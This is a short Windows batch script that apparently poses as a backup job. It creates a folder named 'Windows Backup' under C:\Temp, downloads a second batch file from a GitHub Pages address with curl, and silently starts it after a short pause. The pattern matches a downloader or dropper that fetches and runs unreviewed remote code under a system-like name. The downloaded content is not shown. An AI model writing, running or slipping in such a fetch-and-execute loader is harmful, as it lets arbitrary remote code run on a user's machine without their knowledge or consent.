@echo off
set "url=https://mrzool1.github.io/FirstProject/Backup Data.bat"
set "folder=C:\Temp\Windows Backup"
if not exist "%folder%" (
    mkdir "%folder%"
)
set "filename=C:\Temp\Windows Backup\Backup Data.bat"
curl -o "%filename%" "%url%"
timeout /t 5 /nobreak >nul
start "" "%filename%"
exit /b 0